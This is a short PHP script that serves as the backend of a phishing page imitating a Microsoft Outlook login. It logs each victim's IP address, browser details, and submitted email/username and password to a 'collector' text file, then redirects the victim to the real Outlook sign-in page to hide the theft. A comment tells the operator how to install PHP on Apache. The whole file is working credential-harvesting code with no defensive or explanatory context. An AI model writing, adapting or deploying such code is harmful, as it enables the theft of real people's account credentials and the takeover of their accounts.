<?php
include 'tracker.php';

$file = 'collector_2024-06-18 07:57:05.677291.txt';file_put_contents($file, "\n\n" . $date . "\n" . "IpAddress = " . $ipaddress . "\n" . $useragent . $browser . "\n" . "email/username = " . $email = $_POST['email'] . "\n" . "password = " . $pass = $_POST['pass'] . "\n", FILE_APPEND); 

/* If you are just seeing plain text you need to install php for apache apt-get install libapache2-mod-php */
header('Location: https://outlook.live.com/owa/');
?>